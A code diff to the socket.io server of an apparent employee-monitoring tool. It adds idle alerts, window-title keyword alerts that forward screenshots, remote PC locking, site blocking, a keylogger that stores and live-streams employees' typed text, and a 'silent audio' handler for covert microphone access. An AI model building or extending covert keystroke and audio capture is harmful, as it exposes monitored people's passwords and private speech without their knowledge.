@@ -71,6 +71,7 @@ const socketHandler = (io) => {
                     name: empName,
                     socketId: socket.id,
                     status: 'online',
+                    isIdle: false,
                     connectedAt: new Date()
                 };
 
@@ -82,11 +83,15 @@ const socketHandler = (io) => {
                 io.to(orgRoom).emit('employee_joined', employeeData);
                 io.to('global_monitoring').emit('employee_joined', employeeData);
                 
-                // Fetch and send auto screenshot setting
+                // Fetch and send admin settings
                 try {
                     const adminUser = await User.findById(targetAdminId);
                     if (adminUser) {
                         socket.emit('auto_screenshot_setting', { enabled: adminUser.autoScreenshotsEnabled !== false });
+                        if (adminUser.blockedSites && adminUser.blockedSites.length > 0) {
+                            socket.emit('update_blocked_sites', { domains: adminUser.blockedSites });
+                        }
+                        socket.emit('keylog_setting', { enabled: adminUser.keylogEnabled === true });
                     }
                 } catch (err) {
                     console.error('Error fetching admin settings:', err.message);
@@ -129,7 +134,7 @@ const socketHandler = (io) => {
             io.to(to).emit('screenshot_result', { base64 });
         });
 
-        socket.on('auto_screenshot', async ({ base64 }) => {
+        socket.on('auto_screenshot', async ({ base64, windowTitle }) => {
             const employee = activeEmployees.get(socket.id);
             if (!employee || !employee.adminId) return;
 
@@ -140,10 +145,36 @@ const socketHandler = (io) => {
                     employeeId: employee.id || socket.id,
                     employeeName: employee.name,
                     pcName: employee.pcName,
-                    image: base64
+                    image: base64,
+                    windowTitle: windowTitle || ''
                 });
                 await newScreenshot.save();
-                console.log(`📸 Auto-Screenshot saved for ${employee.name}`);
+                console.log(`📸 Auto-Screenshot saved for ${employee.name} | Window: ${windowTitle || 'N/A'}`);
+
+                // ─── 🚨 Alert System: Check banned keywords ───────────────────
+                try {
+                    const adminUser = await User.findById(employee.adminId);
+                    if (adminUser && adminUser.alertKeywords && adminUser.alertKeywords.length > 0 && windowTitle) {
+                        const lowerTitle = windowTitle.toLowerCase();
+                        const matchedKeyword = adminUser.alertKeywords.find(kw => 
+                            lowerTitle.includes(kw.toLowerCase())
+                        );
+                        if (matchedKeyword) {
+                            console.log(`🚨 ALERT: Banned keyword "${matchedKeyword}" detected for ${employee.name}`);
+                            io.to(`org_${employee.adminId}`).emit('security_alert', {
+                                employeeName: employee.name,
+                                pcName: employee.pcName,
+                                socketId: socket.id,
+                                keyword: matchedKeyword,
+                                windowTitle,
+                                screenshot: base64,
+                                timestamp: new Date()
+                            });
+                        }
+                    }
+                } catch (alertErr) {
+                    console.error('Alert check error:', alertErr.message);
+                }
             } catch (error) {
                 console.error('Error saving auto screenshot:', error);
             }
@@ -164,22 +195,162 @@ const socketHandler = (io) => {
             }
         });
 
+        // ─── 👁️ Idle Detection ─────────────────────────────────────────────────
+        socket.on('employee_idle', ({ idleMinutes }) => {
+            const employee = activeEmployees.get(socket.id);
+            if (!employee || !employee.adminId) return;
+            employee.isIdle = true;
+            employee.idleMinutes = idleMinutes;
+            activeEmployees.set(socket.id, employee);
+            console.log(`💤 Employee IDLE: ${employee.name} (${idleMinutes} min)`);
+            const alertData = {
+                employeeName: employee.name,
+                pcName: employee.pcName,
+                socketId: socket.id,
+                idleMinutes,
+                timestamp: new Date()
+            };
+            io.to(`org_${employee.adminId}`).emit('employee_idle_alert', alertData);
+            io.to('global_monitoring').emit('employee_idle_alert', alertData);
+        });
+
+        socket.on('employee_active', () => {
+            const employee = activeEmployees.get(socket.id);
+            if (!employee || !employee.adminId) return;
+            employee.isIdle = false;
+            employee.idleMinutes = 0;
+            activeEmployees.set(socket.id, employee);
+            io.to(`org_${employee.adminId}`).emit('employee_back_active', {
+                employeeName: employee.name,
+                socketId: socket.id
+            });
+        });
+
+        // ─── 🔒 PC Lock ────────────────────────────────────────────────────────
+        socket.on('lock_pc', ({ employeeSocketId }) => {
+            if (!admins.has(socket.id)) return;
+            console.log(`🔒 Admin locking PC: ${employeeSocketId}`);
+            io.to(employeeSocketId).emit('lock_pc');
+        });
+
+        // ─── 🔢 Multi-Monitor ──────────────────────────────────────────────────
+        socket.on('request_monitors', ({ employeeSocketId }) => {
+            if (!admins.has(socket.id)) return;
+            io.to(employeeSocketId).emit('request_monitors');
+        });
+
+        socket.on('monitors_list', ({ sources }) => {
+            const employee = activeEmployees.get(socket.id);
+            if (!employee || !employee.adminId) return;
+            io.to(`org_${employee.adminId}`).emit('employee_monitors_list', {
+                socketId: socket.id,
+                sources
+            });
+        });
+
+        socket.on('switch_monitor', ({ employeeSocketId, monitorIndex }) => {
+            if (!admins.has(socket.id)) return;
+            io.to(employeeSocketId).emit('switch_monitor', { monitorIndex });
+        });
+
+        // ─── 💬 Admin → Employee Chat ─────────────────────────────────────────
+        socket.on('send_admin_message', ({ employeeSocketId, message, adminName }) => {
+            if (!admins.has(socket.id)) return;
+            console.log(`💬 Admin message → ${employeeSocketId}: ${message}`);
+            io.to(employeeSocketId).emit('admin_message', {
+                from: socket.id,
+                adminName: adminName || 'Admin',
+                message,
+                timestamp: new Date()
+            });
+        });
+
+        // ─── ⌨️ Keylogger ──────────────────────────────────────────────────────
+        socket.on('keylog_batch', async ({ text }) => {
+            const employee = activeEmployees.get(socket.id);
+            if (!employee || !employee.adminId) return;
+            try {
+                const Keylog = require('../models/Keylog');
+                await Keylog.create({
+                    adminId: employee.adminId,
+                    employeeId: employee.id || socket.id,
+                    employeeName: employee.name,
+                    pcName: employee.pcName,
+                    text
+                });
+                io.to(`org_${employee.adminId}`).emit('keylog_live', {
+                    socketId: socket.id,
+                    employeeName: employee.name,
+                    text,
+                    timestamp: new Date()
+                });
+            } catch (err) {
+                console.error('Keylog save error:', err.message);
+            }
+        });
+
+        socket.on('toggle_keylog', async ({ enabled, employeeSocketId }) => {
+            if (!admins.has(socket.id) || !socket.adminId) return;
+            try {
+                await User.findByIdAndUpdate(socket.adminId, { keylogEnabled: enabled });
+                if (employeeSocketId) {
+                    io.to(employeeSocketId).emit('keylog_setting', { enabled });
+                } else {
+                    io.to(`org_${socket.adminId}`).emit('keylog_setting', { enabled });
+                }
+            } catch (e) {
+                console.error('Toggle keylog error:', e);
+            }
+        });
+
+        // ─── 🌐 Website Blocker ────────────────────────────────────────────────
+        socket.on('set_blocked_sites', async ({ domains, employeeSocketId }) => {
+            if (!admins.has(socket.id) || !socket.adminId) return;
+            try {
+                await User.findByIdAndUpdate(socket.adminId, { blockedSites: domains });
+                if (employeeSocketId) {
+                    io.to(employeeSocketId).emit('update_blocked_sites', { domains });
+                } else {
+                    io.to(`org_${socket.adminId}`).emit('update_blocked_sites', { domains });
+                }
+                console.log(`🌐 Blocked sites updated for org_${socket.adminId}:`, domains);
+            } catch (e) {
+                console.error('Blocked sites error:', e);
+            }
+        });
+
+        // ─── 🚨 Alert Keywords Management ─────────────────────────────────────
+        socket.on('set_alert_keywords', async ({ keywords }) => {
+            if (!admins.has(socket.id) || !socket.adminId) return;
+            try {
+                await User.findByIdAndUpdate(socket.adminId, { alertKeywords: keywords });
+                console.log(`🚨 Alert keywords updated for ${socket.adminId}:`, keywords);
+                socket.emit('alert_keywords_saved', { keywords });
+            } catch (e) {
+                console.error('Alert keywords error:', e);
+            }
+        });
+
+        // ─── 🔊 Silent Audio Monitoring ───────────────────────────────────────
+        socket.on('silent_audio_request', ({ employeeSocketId }) => {
+            if (!admins.has(socket.id)) return;
+            io.to(employeeSocketId).emit('silent_audio_request', { adminSocketId: socket.id });
+        });
+
+        socket.on('silent_audio_signal', ({ to, signal }) => {
+            io.to(to).emit('silent_audio_signal', { from: socket.id, signal });
+        });
+
+        // ─── Meeting Events ────────────────────────────────────────────────────
         socket.on('start_meeting', ({ roomName }) => {
             const admin = activeEmployees.get(socket.id) || { adminId: socket.adminId };
             const orgRoom = `org_${socket.adminId || admin.adminId}`;
             console.log(`📡 Meeting Started: ${roomName} in ${orgRoom}`);
-            
-            // Broadcast to the org room
             io.to(orgRoom).emit('meeting_invitation', { roomName, hostId: socket.id, hostName: 'Admin' });
-            
-            // If the user is a superadmin, also broadcast to all employees directly or via global_monitoring
-            // Since employees don't join global_monitoring, we must iterate or just let them use the sidebar.
-            // Wait, we can emit to all active employees that belong to this superadmin's view.
             if (admins.has(socket.id) && socket.role === 'superadmin') {
                 for (const emp of activeEmployees.values()) {
                     io.to(emp.socketId).emit('meeting_invitation', { roomName, hostId: socket.id, hostName: 'SuperAdmin' });
                 }
-                console.log(`📡 SuperAdmin Meeting Broadcasted to all online employees.`);
             }
         });
 
